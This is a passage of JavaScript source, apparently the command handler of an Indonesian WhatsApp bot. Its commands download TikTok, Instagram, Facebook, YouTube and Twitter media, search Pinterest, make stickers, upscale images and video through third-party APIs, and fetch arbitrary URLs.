                        let info = `*TIKTOK DOWNLOADER*

📌 *Judul:* ${d.title || "-"}
🌍 *Region:* ${d.region || "-"}
⏱️ *Durasi:* ${formatDuration(d.duration)}
👁️ *Views:* ${formatNumber(d.play_count)}
💬 *Komentar:* ${formatNumber(d.comment_count)}
🔁 *Share:* ${formatNumber(d.share_count)}
👤 *Uploader:* ${d.author?.nickname || d.author?.unique_id || "-"}
`;
                        await m.reply(info);

                        if (d.images?.length) {
                            if (d.images.length === 1) {
                                await sock.sendMessage(
                                    m.chat,
                                    { image: { url: d.images[0] } },
                                    { quoted: m }
                                );
                            } else {
                                for (let i = 0; i < d.images.length; i++) {
                                    await sock.sendMessage(
                                        m.chat,
                                        {
                                            image: { url: d.images[i] },
                                            caption: i === 0 ? d.title || "" : ""
                                        },
                                        { quoted: m }
                                    );
                                }
                            }
                        }


                        else {
                            await sock.sendMessage(
                                m.chat,
                                { video: { url: d.play }, caption: d.title || "" },
                                { quoted: m }
                            );
                        }

                        if (d.music_info?.play) {
                            await sock.sendMessage(
                                m.chat,
                                {
                                    audio: { url: d.music_info.play },
                                    mimetype: "audio/mpeg",
                                    fileName: `${d.title || "tiktok"}.mp3`
                                },
                                { quoted: m }
                            );
                        }

                    } else {
                        const res = await fetch(
                            `https://www.tikwm.com/api/feed/search?keywords=${encodeURIComponent(
                                input
                            )}&count=1&cursor=0&web=1&hd=1`
                        );
                        const json = await res.json();
                        const v = json?.data?.videos?.[0];
                        if (!v) return m.reply("❌ Video tidak ditemukan");

                        await sock.sendMessage(m.chat, { react: { text: '✅', key: m.key } })

                        let caption = `*TIKTOK SEARCH*

📌 *Judul:* ${v.title}
🌍 *Region:* ${v.region}
⏱️ *Durasi:* ${formatDuration(v.duration)}
👁️ *Views:* ${formatNumber(v.play_count)}
💬 *Komentar:* ${formatNumber(v.comment_count)}
🔁 *Share:* ${formatNumber(v.share_count)}
👤 *Uploader:* ${v.author.nickname || v.author.unique_id}
`;

                        if (!isAn) {
                            db.decrementLimit(m.sender);
                        }
                        await sock.sendMessage(
                            m.chat,
                            {
                                video: { url: "https://www.tikwm.com" + v.play },
                                caption
                            },
                            { quoted: m }
                        );
                    }
                } catch (e) {
                    console.error(e);
                    m.reply("❌ Terjadi kesalahan saat memproses TikTok");
                }
            }
                break;

            case "ig":
            case "igdl":
            case "instagram": {
                if (!text) return m.reply("Masukkan link Instagram")

                const url = text.match(/https?:\/\/(www\.)?instagram\.com\/[^\s]+/i)?.[0]
                if (!url) return m.reply("Link Instagram tidak valid")

                m.reply("📥 Wait mengunduh Instagram (video + audio)...")

                try {
                    const { videoPath, audioPath } = await igAuto(url)

                    // kirim video
                    await sock.sendMessage(
                        m.chat,
                        { video: fs.readFileSync(videoPath), caption: "🎬 Instagram Download" },
                        { quoted: m }
                    )

                    // kirim audio
                    await sock.sendMessage(
                        m.chat,
                        {
                            audio: fs.readFileSync(audioPath),
                            mimetype: "audio/mpeg",
                            fileName: "instagram.mp3"
                        },
                        { quoted: m }
                    )

                    fs.unlinkSync(videoPath)
                    fs.unlinkSync(audioPath)
                } catch (e) {
                    console.error(e)
                    m.reply("❌ Gagal download Instagram")
                }
            }
                break

            case "fb":
            case "facebook": {
                try {
                    if (!text)
                        return m.reply(
                            `*FACEBOOK DOWNLOADER*

• Download:
  ${prefix + command} https://facebook.com/xxxxx`
                        )

                    await sock.sendMessage(m.chat, { react: { text: "🧭", key: m.key } })

                    const results = await fbDownloader(text)
                    if (!results.length) return m.reply("❌ Video tidak ditemukan")

                    // ambil kualitas terbaik (biasanya index 0)
                    const video = results[0]

                    await sock.sendMessage(m.chat, { react: { text: "⬇️", key: m.key } })

                    await sock.sendMessage(
                        m.chat,
                        {
                            video: { url: video.url },
                            caption: `〽️ *FACEBOOK DOWNLOADER*

 *Kualitas:* ${video.quality}
 *Source:* Facebook`
                        },
                        { quoted: m }
                    )

                    await sock.sendMessage(m.chat, { react: { text: "✅", key: m.key } })
                } catch (e) {
                    console.error(e)
                    m.reply("❌ Gagal mengunduh video Facebook")
                }
            }
                break

            case 'play':
            case 'playyt': {
                if (!text) return reply(`Masukkan judul lagu yang ingin diputar!\n*Contoh:* ${prefix + command} sempurna andra and the backbone`);

                await sock.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });

                try {
                    // 1. Mencari video di YouTube
                    const search = await yts(text);
                    const video = search.videos[0];

                    if (!video) {
                        await sock.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
                        return reply('Lagu tidak ditemukan! Coba gunakan kata kunci yang lebih spesifik.');
                    }


                    let caption = `🎵 *Y O U T U B E  P L A Y*\n\n`;
                    caption += `∘ *Judul:* ${video.title}\n`;
                    caption += `∘ *Durasi:* ${video.timestamp}\n`;
                    caption += `∘ *Channel:* ${video.author.name}\n`;
                    caption += `∘ *Views:* ${video.views}\n`;
                    caption += `∘ *Link:* ${video.url}\n\n`;
                    caption += `_Sedang mengunduh audio, mohon tunggu sebentar..._`;


                    const playMsg = await sock.sendMessage(m.chat, {
                        image: { url: video.thumbnail },
                        caption: caption
                    }, { quoted: m });


                    const res = await youtubeDl(video.url, true);

                    if (!res.status) {
                        await sock.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
                        return reply(`Gagal mengunduh audio: ${res.message}`);
                    }


                    await sock.sendMessage(m.chat, {
                        audio: { url: res.dl_url },
                        mimetype: 'audio/mpeg',
                        ptt: false,
                        contextInfo: {
                            externalAdReply: {
                                title: video.title,
                                body: "Audio Downloaded Successfully",
                                thumbnailUrl: video.thumbnail,
                                sourceUrl: video.url,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, { quoted: playMsg });

                    await sock.sendMessage(m.chat, { react: { text: "✅", key: m.key } });

                } catch (err) {
                    console.error(err);
                    await sock.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
                    reply('Terjadi kesalahan saat mencari atau mengunduh lagu.');
                }
            }
                break;

            case 'ytmp4':
            case 'ytvideo': {
                if (!text) return reply(`Masukkan link YouTube yang ingin diunduh!\n*Contoh:* ${prefix + command} https://youtu.be/xxxxx`);
                if (!text.includes('youtu')) return reply('Link tidak valid! Pastikan itu adalah link YouTube.');

                await sock.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });

                const res = await youtubeDl(text, false); // isAudio = false untuk video

                if (!res.status) {
                    await sock.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
                    return reply(`Gagal mengunduh video: ${res.message}`);
                }

                await sock.sendMessage(m.chat, {
                    video: { url: res.dl_url },
                    caption: `🎥 *${res.title}*\n\nBerhasil diunduh`,
                    mimetype: 'video/mp4'
                }, { quoted: m });

                await sock.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
            }
                break;

            case 'ytmp3':
            case 'ytaudio': {
                if (!text) return reply(`Masukkan link YouTube yang ingin diunduh!\n*Contoh:* ${prefix + command} https://youtu.be/xxxxx`);
                if (!text.includes('youtu')) return reply('Link tidak valid! Pastikan itu adalah link YouTube.');

                await sock.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });

                const res = await youtubeDl(text, true); // isAudio = true untuk audio

                if (!res.status) {
                    await sock.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
                    return reply(`Gagal mengunduh audio: ${res.message}`);
                }

                await sock.sendMessage(m.chat, {
                    audio: { url: res.dl_url },
                    mimetype: 'audio/mpeg',
                    ptt: false,
                    contextInfo: {
                        externalAdReply: {
                            title: res.title,
                            body: "Audio Downloaded Successfully",
                            thumbnailUrl: res.thumbnail,
                            sourceUrl: text,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, { quoted: m });

                await sock.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
            }
                break;



            case "pinterest":
            case "pin": {
                if (!text) return m.reply(example("Anime Douchin 6 max 6 foto ya bre"))

                m.reply("⏳ Tunggu sebentar Bang/kak, sedang mengambil gambar...")

                let jumlah = 6
                let argsText = args
                const lastArg = args[args.length - 1]

                if (!isNaN(lastArg)) {
                    jumlah = Math.min(Math.max(parseInt(lastArg), 1), 10)
                    argsText = args.slice(0, -1)
                }

                const query = argsText.join(" ")

                try {
                    const { data } = await axios.get(
                        `https://api.siputzx.my.id/api/s/pinterest?query=${encodeURIComponent(query)}`
                    )

                    if (!data.status || !data.data?.length) {
                        return m.reply("❌ Gambar tidak ditemukan.")
                    }

                    const results = data.data
                        .sort(() => Math.random() - 0.5)
                        .slice(0, jumlah)

                    async function createImage(url) {
                        const { imageMessage } = await generateWAMessageContent(
                            { image: { url } },
                            { upload: sock.waUploadToServer }
                        )
                        return imageMessage
                    }

                    let cards = []
                    let i = 1

                    for (let item of results) {
                        cards.push({
                            body: proto.Message.InteractiveMessage.Body.fromObject({
                                text: `Hasil gambar ke-${i++}`
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.fromObject({
                                text: "@VannessWangsaff"
                            }),
                            header: proto.Message.InteractiveMessage.Header.fromObject({
                                title: query,
                                hasMediaAttachment: true,
                                imageMessage: await createImage(item.image_url)
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                buttons: [
                                    {
                                        name: "cta_url",
                                        buttonParamsJson: JSON.stringify({
                                            display_text: "Get Pinterest",
                                            url: item.pin,
                                            merchant_url: item.pin
                                        })
                                    }
                                ]
                            })
                        })
                    }

                    const msg = generateWAMessageFromContent(
                        m.chat,
                        {
                            viewOnceMessage: {
                                message: {
                                    messageContextInfo: {
                                        deviceListMetadata: {},
                                        deviceListMetadataVersion: 2
                                    },
                                    interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                                        body: proto.Message.InteractiveMessage.Body.create({
                                            text: `📌 *Hasil Pencarian Pinterest*\n🔎 Type: ${query}\n👤 Permintaan: @${m.pushName}`
                                        }),
                                        footer: proto.Message.InteractiveMessage.Footer.create({
                                            text: "© @VannessWangsaff ID"
                                        }),
                                        header: proto.Message.InteractiveMessage.Header.create({
                                            hasMediaAttachment: false
                                        }),
                                        carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                                            cards
                                        })
                                    })
                                }
                            }
                        },
                        { quoted: m }
                    )

                    await sock.relayMessage(m.chat, msg.message, { messageId: msg.key.id })

                } catch (e) {
                    console.error(e)
                    m.reply("❌ Terjadi kesalahan saat mengambil gambar.")
                }
            }
                break


            case "iqc": {
                if (!text) return m.reply(example("teks quote nya bre mana"))

                await sock.sendMessage(
                    m.chat,
                    { react: { text: "🧭", key: m.key } }
                )

                try {
                    const time = new Date().toLocaleTimeString("id-ID", {
                        timeZone: "Asia/Jakarta",
                        hour: "2-digit",
                        minute: "2-digit"
                    })


                    const apiUrl = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(time)}&messageText=${encodeURIComponent(text)}`

                    const res = await axios.get(apiUrl, {
                        responseType: "arraybuffer"
                    })

                    await sock.sendMessage(
                        m.chat,
                        { react: { text: "✅", key: m.key } }
                    )

                    const buffer = Buffer.from(res.data)

                    await sock.sendMessage(
                        m.chat,
                        {
                            image: buffer,
                            caption: `🖼️ *Image Quote Creator*\n\n"${text}"`
                        },
                        { quoted: m }
                    )

                } catch (err) {
                    console.error("IQC Error:", err)
                    m.reply("❌ Gagal membuat image quote.")
                }
            }
                break







            case "getpp": {
                if (!m.quoted && !m.mentionedJid?.length) {
                    return m.reply(
                        example(`Tag atau reply user target.\n\nContoh: *${prefix + command} @user*`)
                    )
                }

                await sock.sendMessage(
                    m.chat,
                    { react: { text: "🧭", key: m.key } }
                )

                try {
                    let target
                    if (m.quoted) {
                        target = m.quoted.sender
                    } else if (m.mentionedJid?.length) {
                        target = m.mentionedJid[0]
                    } else {
                        target = m.sender
                    }

                    const no = target.split("@")[0]

                    let pp
                    try {
                        pp = await sock.profilePictureUrl(target, "image")
                    } catch {
                        return m.reply("❌ User tidak punya foto profil atau disembunyikan.")
                    }

                    await sock.sendMessage(
                        m.chat,
                        { react: { text: "✅", key: m.key } }
                    )

                    await sock.sendMessage(
                        m.chat,
                        {
                            image: { url: pp },
                            caption: `Berhasil ambil Foto profil @${no}`,
                            mentions: [target]
                        },
                        { quoted: m }
                    )

                } catch (err) {
                    console.error("GETPP Error:", err)
                    m.reply("❌ Gagal mengambil foto profil.")
                }
            }
                break

            case "bratvid": {
                if (!text) return m.reply(example("teksnya mana bree"))

                try {
                    await sock.sendMessage(
                        m.chat,
                        { react: { text: "🧭", key: m.key } }
                    )

                    const url = `https://api-faa.my.id/faa/bratvid?text=${encodeURIComponent(text)}`
                    const res = await axios.get(url, { responseType: "arraybuffer" })

                    await sock.sendMessage(
                        m.chat,
                        { react: { text: "✅", key: m.key } }
                    )

                    await sock.sendVideoAsSticker(
                        m.chat,
                        res.data,
                        m,
                        {
                            packname: global.packname,
                            author: global.author
                        }
                    )

                } catch (err) {
                    console.error("BRATVID Error:", err)
                    m.reply("❌ Gagal membuat stiker brat video.")
                }
            }
                break

            case "smeme": {
                if (!/image|webp/.test(mime)) {
                    return m.reply(
                        example("Kirim atau reply gambar/webp dengan teks atas|bawah")
                    )
                }

                let [atas, bawah] = text.split("|")
                if (!atas) return m.reply(example("teksatas|teksbawah (bawah opsional)"))

                await sock.sendMessage(
                    m.chat,
                    { react: { text: "🧭", key: m.key } }
                )

                let tempFile
                try {
                    // 1️⃣ Download media
                    tempFile = await sock.downloadAndSaveMediaMessage(qmsg)

                    // 2️⃣ Upload ke Uguu / Catbox
                    const uploadedUrl = await uploader.uguu(tempFile)

                    // 3️⃣ Panggil API smeme
                    const apiUrl = `https://api.ryuu-dev.offc.my.id/tools/smeme?img=${encodeURIComponent(uploadedUrl)}&atas=${encodeURIComponent(atas)}&bawah=${encodeURIComponent(bawah || "")}`
                    const res = await axios.get(apiUrl, { responseType: "arraybuffer" })

                    await sock.sendMessage(
                        m.chat,
                        { react: { text: "✅", key: m.key } }
                    )

                    // 4️⃣ Kirim sebagai stiker
                    await sock.sendImageAsSticker(
                        m.chat,
                        res.data,
                        m,
                        {
                            packname: global.packname,
                            author: global.author
                        }
                    )

                } catch (err) {
                    console.error("SMEME Error:", err)
                    m.reply("❌ Terjadi kesalahan saat membuat meme.")
                } finally {
                    // 5️⃣ Hapus file sementara
                    try {
                        if (tempFile && fs.existsSync(tempFile)) {
                            fs.unlinkSync(tempFile)
                        }
                    } catch (e) {
                        console.error("Cleanup Error:", e)
                    }
                }
            }
                break

            case "upswgc":
            case "swgc":
            case "swgrup": {
                if (!m.isGroup) return m.reply(mess.group)
                if (!isAdmin) return m.reply(mess.admin)
                if (!isBotAdmin) return m.reply(mess.botAdmin)

                const qmsg = m.quoted ? m.quoted : m
                const mime = (qmsg.msg || qmsg).mimetype || ""
                const caption = text
                    .replace(new RegExp(`^${prefix + command}\\s*`, "i"), "")
                    .trim()

                if (!mime && !caption) {
                    return m.reply(example("Halo semua (opsional reply media)"))
                }

                await sock.sendMessage(
                    m.chat,
                    { react: { text: "🧭", key: m.key } }
                )

                try {
                    async function groupStatus(sock, jid, content) {
                        const { backgroundColor } = content
                        delete content.backgroundColor

                        const inside = await generateWAMessageContent(content, {
                            upload: sock.waUploadToServer,
                            backgroundColor
                        })

                        const messageSecret = randomBytes(32)

                        const msg = generateWAMessageFromContent(
                            jid,
                            {
                                messageContextInfo: { messageSecret },
                                groupStatusMessageV2: {
                                    message: {
                                        ...inside,
                                        messageContextInfo: { messageSecret }
                                    }
                                }
                            },
                            {}
                        )

                        await sock.relayMessage(jid, msg.message, {
                            messageId: msg.key.id
                        })

                        return msg
                    }

                    let payload = {}

                    if (/image/.test(mime)) {
                        const buffer = await qmsg.download()
                        payload = {
                            image: buffer,
                            caption
                        }
                    } else if (/video/.test(mime)) {
                        const buffer = await qmsg.download()
                        payload = {
                            video: buffer,
                            caption
                        }
                    } else if (/audio/.test(mime)) {
                        const buffer = await qmsg.download()
                        payload = {
                            audio: buffer,
                            mimetype: "audio/mp4"
                        }
                    } else if (caption) {
                        payload = {
                            text: caption
                        }
                    }

                    await groupStatus(sock, m.chat, payload)

                    m.reply("✅ Status grup berhasil diposting.")
                } catch (err) {
                    console.error("UPSWGC Error:", err)
                    m.reply("❌ Gagal upload status grup.")
                }
            }
                break

            case "mediafire":
            case "mf": {
                if (!text) return m.reply(example("https://www.mediafire.com/file/xxxx/file"))

                if (!/mediafire\.com/.test(text)) {
                    return m.reply("❌ Link bukan MediaFire.")
                }

                await sock.sendMessage(
                    m.chat,
                    { react: { text: "🧭", key: m.key } }
                )

                try {
                    const data = await mediafireScrape(text)

                    if (!data.link) {
                        return m.reply("❌ Gagal mengambil link download.")
                    }

                    let caption = `📦 *MEDIAFIRE DOWNLOADER*\n`
                    caption += `📄 Nama : ${data.title}\n`
                    caption += `📊 Size : ${data.size}\n`
                    caption += `📁 Type : ${data.mimetype}\n`
                    caption += `⏬ Wait Mengirim file...`

                    await sock.sendMessage(
                        m.chat,
                        { react: { text: "✅", key: m.key } }
                    )

                    await sock.sendMessage(
                        m.chat,
                        {
                            image: { url: data.image },
                            caption
                        },
                        { quoted: m }
                    )

                    await sock.sendMessage(
                        m.chat,
                        {
                            document: { url: data.link },
                            fileName: data.title,
                            mimetype: data.mimetype
                        },
                        { quoted: m }
                    )

                } catch (err) {
                    console.error("MEDIAFIRE Error:", err)
                    m.reply("❌ Gagal mengambil file MediaFire.")
                }
            }
                break

            case "hd":
            case "remini": {
                try {
                    let media = m.quoted ? m.quoted : m
                    const mime = (media.msg || media).mimetype || ""

                    if (!/image/.test(mime)) {
                        return m.reply("Reply / kirim gambar dengan .hd")
                    }

                    await m.reply("Wait sedang meningkatkan kualitas gambar (HD)...")

                    // download image
                    const filePath = await sock.downloadAndSaveMediaMessage(media)

                    // upload ke catbox
                    const form = new FormData()
                    form.append("fileToUpload", fs.createReadStream(filePath))
                    form.append("reqtype", "fileupload")

                    let uploadRes
                    try {
                        uploadRes = await axios.post(
                            "https://catbox.moe/user/api.php",
                            form,
                            {
                                headers: form.getHeaders(),
                                timeout: 60000
                            }
                        )
                    } catch (e) {
                        fs.unlinkSync(filePath)
                        return m.reply("❌ Gagal upload gambar")
                    }

                    if (!uploadRes || typeof uploadRes.data !== "string" || !uploadRes.data.startsWith("http")) {
                        fs.unlinkSync(filePath)
                        return m.reply("❌ Upload gambar gagal")
                    }

                    const imageUrl = uploadRes.data.trim()

                    // request upscale
                    let upscaleRes
                    try {
                        upscaleRes = await axios.get(
                            `https://api.ryuu-dev.offc.my.id/imagecreator/upscaler4k?url=${encodeURIComponent(imageUrl)}`,
                            { timeout: 120000 }
                        )
                    } catch (e) {
                        fs.unlinkSync(filePath)
                        return m.reply("❌ Gagal memproses gambar")
                    }

                    if (
                        !upscaleRes ||
                        !upscaleRes.data ||
                        !upscaleRes.data.status ||
                        !upscaleRes.data.result
                    ) {
                        fs.unlinkSync(filePath)
                        return m.reply("❌ Upscale gagal")
                    }

                    await sock.sendMessage(
                        m.chat,
                        {
                            image: { url: upscaleRes.data.result },
                            caption: "✨ Berhasil HD Kan Gambar Anda"
                        },
                        { quoted: m }
                    )

                    // cleanup
                    if (fs.existsSync(filePath)) fs.unlinkSync(filePath)

                } catch (err) {
                    console.error("HD / REMINI ERROR:", err)
                    m.reply("❌ Terjadi kesalahan saat memproses gambar")
                }
            }
                break

            case 'hdvid': {
                const q = m.quoted || m
                const mime = (q.msg || q).mimetype || ''

                if (!mime.startsWith('video/')) {
                    return m.reply('Reply / kirim video untuk di-HD-kan')
                }

                await m.reply('Wait Memproses HD video yang anda minta...')

                const baseApi = 'https://api.unblurimage.ai'
                const productSerial = crypto.randomUUID().replace(/-/g, '')
                const sleep = ms => new Promise(r => setTimeout(r, ms))

                try {

                    const uploadForm = new FormData()
                    uploadForm.append('video_file_name', `hd-${Date.now()}.mp4`)

                    const uploadResp = await axios.post(
                        `${baseApi}/api/upscaler/v1/ai-video-enhancer/upload-video`,
                        uploadForm,
                        {
                            headers: uploadForm.getHeaders(),
                            timeout: 20000
                        }
                    )

                    if (uploadResp.data.code !== 100000) {
                        throw 'Gagal mendapatkan upload URL'
                    }

                    const { url: uploadUrl, object_name } = uploadResp.data.result

                    const msg = q.msg || q
                    const type = 'video'

                    const stream = await downloadContentFromMessage(msg, type)

                    await axios.put(uploadUrl, stream, {
                        headers: { 'content-type': 'video/mp4' },
                        maxBodyLength: Infinity,
                        maxContentLength: Infinity,
                        timeout: 0
                    })

                    const cdnUrl = `https://cdn.unblurimage.ai/${object_name}`

                    const jobForm = new FormData()
                    jobForm.append('original_video_file', cdnUrl)
                    jobForm.append('resolution', '2k')
                    jobForm.append('is_preview', 'false')

                    const jobResp = await axios.post(
                        `${baseApi}/api/upscaler/v2/ai-video-enhancer/create-job`,
                        jobForm,
                        {
                            headers: {
                                ...jobForm.getHeaders(),
                                'product-serial': productSerial
                            }
                        }
                    )

                    if (jobResp.data.code !== 100000) {
                        throw 'Gagal membuat job HD'
                    }

                    const jobId = jobResp.data.result.job_id

                    let outputUrl
                    const start = Date.now()

                    while (!outputUrl) {
                        if (Date.now() - start > 4 * 60 * 1000) {
                            throw 'Timeout proses HD video'
                        }

                        const statusResp = await axios.get(
                            `${baseApi}/api/upscaler/v2/ai-video-enhancer/get-job/${jobId}`,
                            {
                                headers: { 'product-serial': productSerial }
                            }
                        )

                        if (statusResp.data?.result?.output_url) {
                            outputUrl = statusResp.data.result.output_url
                            break
                        }

                        await sleep(4000)
                    }
                    await sock.sendMessage(
                        m.chat,
                        {
                            document: { url: outputUrl },
                            mimetype: 'video/mp4',
                            fileName: 'HD VIDEO BY Vanness.mp4',
                            caption: 'Berhasil Meng HD Kan Video\n> maaf yee type document'
                        },
                        { quoted: m }
                    )

                } catch (err) {
                    console.error('[HDVID ERROR]', err)
                    m.reply('❌ Gagal memproses HD video')
                }
            }
                break

            case "perplexity":
            case "pplx": {
                if (!text) return m.reply("Apa itu JavaScript?")

                await sock.sendMessage(
                    m.chat,
                    { text: "🔍 Sedang mencari informasi..." },
                    { quoted: m }
                )

                try {
                    let response
                    try {
                        response = await axios.get(
                            `https://api.nexray.web.id/ai/perplexity?text=${encodeURIComponent(text)}`,
                            { timeout: 30000 }
                        )
                    } catch (e) {
                        throw "Request API gagal"
                    }

                    if (!response || !response.data || !response.data.result) {
                        throw "Response API kosong"
                    }

                    const hasil = response.data.result

                    const caption = `
🔍 *PERPLEXITY AI BY Vanness*

${hasil}
        `.trim()

                    await sock.sendMessage(
                        m.chat,
                        {
                            text: caption,
                            contextInfo: {
                                externalAdReply: {
                                    title: "@VannessWangsaff",
                                    body: "Real-time Information Assistant",
                                    thumbnailUrl: "https://files.catbox.moe/j1n4i7.jpg",
                                    sourceUrl: "https://lynk.id/adshopdigital",
                                    mediaType: 1,
                                    renderLargerThumbnail: true
                                }
                            }
                        },
                        { quoted: m }
                    )

                } catch (err) {
                    console.error("PERPLEXITY ERROR:", err)
                    m.reply("❌ Maaf, layanan AI sedang bermasalah.")
                }
            }
                break

            case "aichat":
            case "chatbot": {
                if (!text) return m.reply(example("Buatkan contoh backend server"))


                await sock.sendMessage(m.chat, {
                    react: { text: "⏳", key: m.key }
                })

                try {
                    const url =
                        "https://zelapioffciall.koyeb.app/ai/chatbot?text=" +
                        encodeURIComponent(text)

                    const res = await fetch(url)
                    if (!res.ok) throw new Error("Fetch gagal")

                    const json = await res.json()

                    if (!json || json.status !== true) {
                        return m.reply("🍂 Gagal mendapatkan jawaban dari AI.")
                    }

                    const jawaban = json.answer || "Tidak ada jawaban."

                    const caption =
                        `⚡ *AI Chatbot By @VannessWangsaff*\n\n` +
                        `📝 *Pertanyaan user:*\n${text}\n\n` +
                        `👉 *Jawaban AI:*\n${jawaban}`

                    await sock.sendMessage(
                        m.chat,
                        { text: caption },
                        { quoted: m }
                    )

                } catch (err) {
                    console.error("AICHAT ERROR:", err)
                    m.reply("❌ Terjadi kesalahan saat memproses AI.")
                } finally {
                    // hapus react
                    await sock.sendMessage(m.chat, {
                        react: { text: "✅", key: m.key }
                    })
                }
            }
                break

            case "get2": {

                if (!text) return m.reply(`Contoh:\n${prefix + command} https://example.com/file`)

                await sock.sendMessage(m.chat, {
                    react: { text: "⚡", key: m.key }
                })

                try {
                    const res = await fetch(text)
                    if (!res.ok) return m.reply(`❌ Gagal fetch (${res.status})`)

                    const contentLength = res.headers.get("content-length")
                    if (contentLength && Number(contentLength) > 100 * 1024 * 1024)
                        return m.reply(`❌ File terlalu besar (>100MB)`)

                    const contentType = res.headers.get("content-type") || ""
                    const buffer = Buffer.from(await res.arrayBuffer())

                    // ambil nama file
                    let filename =
                        text.split("/").pop()?.split("?")[0] || "file"


                    if (contentType.startsWith("image/")) {
                        return await sock.sendMessage(
                            m.chat,
                            { image: buffer },
                            { quoted: m }
                        )
                    }


                    if (contentType.startsWith("video/")) {
                        return await sock.sendMessage(
                            m.chat,
                            { video: buffer },
                            { quoted: m }
                        )
                    }


                    if (contentType.startsWith("audio/")) {
                        return await sock.sendMessage(
                            m.chat,
                            {
                                audio: buffer,
                                mimetype: contentType,
                                ptt: true
                            },
                            { quoted: m }
                        )
                    }


                    await sock.sendMessage(
                        m.chat,
                        {
                            document: buffer,
                            mimetype: contentType || "application/octet-stream",
                            fileName: filename
                        },
                        { quoted: m }
                    )

                } catch (err) {
                    console.error("GET ERROR:", err)
                    m.reply("❌ Terjadi kesalahan saat mengambil file.")
                }
            }
                break

            case "get":
            case "fetch": {
                if (!text) return m.reply("Masukkan URL")
                if (!/^https?:\/\//i.test(text)) text = "http://" + text

                await sock.sendMessage(m.chat, {
                    react: { text: "⚡", key: m.key }
                })

                let res
                try {
                    res = await axios.get(text, {
                        responseType: "arraybuffer",
                        timeout: 15000,
                        maxRedirects: 5,
                        headers: {
                            "user-agent":
                                "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
                        }
                    })
                } catch (e) {
                    return m.reply("❌ Gagal fetch URL:\n" + e.message)
                }

                const headers = res.headers || {}
                const type = (headers["content-type"] || "").split(";")[0]
                const size = Number(headers["content-length"] || 0)

                if (size > 200 * 1024 * 1024)
                    return m.reply("❌ File terlalu besar (>200MB)")

                let filename = "file"
                try {
                    const urlObj = new URL(res.request?.res?.responseUrl || text)
                    filename = urlObj.pathname.split("/").pop() || "file"
                } catch { }

                const buffer = Buffer.from(res.data)


                if (type.startsWith("image/")) {
                    return await sock.sendMessage(
                        m.chat,
                        { image: buffer, caption: text },
                        { quoted: m }
                    )
                }


                if (type === "application/json") {
                    try {
                        const json = JSON.parse(buffer.toString())
                        const pretty = JSON.stringify(json, null, 2)

                        await m.reply(pretty.slice(0, 65536))

                        return await sock.sendMessage(
                            m.chat,
                            {
                                document: Buffer.from(pretty),
                                fileName: "file.json",
                                mimetype: "application/json"
                            },
                            { quoted: m }
                        )
                    } catch {
                        return m.reply("❌ JSON rusak / tidak valid")
                    }
                }


                if (type.startsWith("text/")) {
                    const txt = buffer.toString("utf8")

                    await m.reply(txt.slice(0, 65536))

                    return await sock.sendMessage(
                        m.chat,
                        {
                            document: Buffer.from(txt),
                            fileName: type === "text/html" ? "file.html" : "file.txt",
                            mimetype: type
                        },
                        { quoted: m }
                    )
                }


                await sock.sendMessage(
                    m.chat,
                    {
                        document: buffer,
                        fileName: filename,
                        mimetype: type || "application/octet-stream"
                    },
                    { quoted: m }
                )
            }
                break

            case "hd2":
            case "hdr": {
                const q = m.quoted ? m.quoted : m
                const mime = (q.msg || q).mimetype || ""

                if (!/image/.test(mime))
                    return m.reply(`Kirim / reply gambar dengan caption ${prefix + command}`)

                await sock.sendMessage(m.chat, {
                    react: { text: "🧭", key: m.key }
                })

                try {
                    const media = await q.download()
                    if (!media) return m.reply("❌ Gagal download gambar")

                    // scale: hdr = 4 | hd = 2
                    const scale = /^hdr$/i.test(command) ? 4 : 2

                    const result = await hdr(media, scale)

                    await sock.sendMessage(
                        m.chat,
                        {
                            image: result,
                            caption: "✨ Success HD kan foto anda"
                        },
                        { quoted: m }
                    )

                } catch (err) {
                    console.error("HD/HDR ERROR:", err)
                    m.reply("❌ Gagal memproses gambar.")
                }
            }
                break

            case "twitter":
            case "x": {
                if (!text) return m.reply("Masukkan URL twitter nya")

                await sock.sendMessage(m.chat, {
                    react: { text: "🐦", key: m.key }
                })

                try {
                    const result = await twitter(text)

                    if (result.type === "video") {
                        let vid =
                            result.download.find(v => v.type === "mp4" && v.reso === "1024p") ||
                            result.download.find(v => v.type === "mp4")

                        if (!vid)
                            return sock.sendMessage(m.chat, {
                                sticker: { url: "https://files.catbox.moe/rd9i0t.jpg" }
                            })

                        await sock.sendMessage(
                            m.chat,
                            { video: { url: vid.url }, caption: "Success Twitter Video" },
                            { quoted: m }
                        )

                    } else if (result.type === "image") {
                        const img = result.download[0]
                        if (!img)
                            return sock.sendMessage(m.chat, {
                                sticker: { url: "https://files.catbox.moe/rd9i0t.jpg" }
                            })

                        await sock.sendMessage(
                            m.chat,
                            { image: { url: img.url }, caption: "Success Twitter Image" },
                            { quoted: m }
                        )

                    } else {
                        await sock.sendMessage(m.chat, {
                            sticker: { url: "https://files.catbox.moe/rd9i0t.jpg" }
                        })
                    }

                } catch (err) {
                    console.error("TWITTER ERROR:", err)
                    m.reply("❌ Gagal download Twitter")
                }
            }
                break

            case "tm":
            case "bola":
            case "transfermarkt": {
                if (!text)
                    return m.reply(`Masukkan nama pemain!\nContoh: ${prefix + command} Cristiano Ronaldo`)

                await sock.sendMessage(m.chat, {
                    react: { text: "⚽", key: m.key }
                })

                try {
                    const query = encodeURIComponent(text)
                    const search = await axios.get(
                        `https://www.transfermarkt.com/schnellsuche/ergebnis/schnellsuche?query=${query}`,
                        { headers }
                    )

